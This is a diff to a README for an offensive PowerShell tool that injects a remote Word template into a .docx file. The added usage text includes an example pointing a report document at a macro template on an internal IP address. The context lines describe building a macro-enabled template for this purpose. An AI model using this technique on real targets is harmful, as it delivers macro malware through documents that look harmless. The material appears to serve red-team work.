@@ -8,6 +8,17 @@ PowerShell version 5 or greater.
 
 ### Usage
 
+usage: .\TemplateInjection.ps1 DOCX URL
+
+positional arguments:
+  DOCX            .docx file to inject template into
+  URL             remote Microsoft template
+
+Example of use
+To inject remote http url:
+
+.\TemplateInjection.ps1 C:\dump\report.docx http:\\192.168.238.141\template.dot
+
 ### Basic steps
 
 1. Create a Microsoft Word template with macro, and save as a .dotm file (Word Macro-Enabled Template (*.dotm)
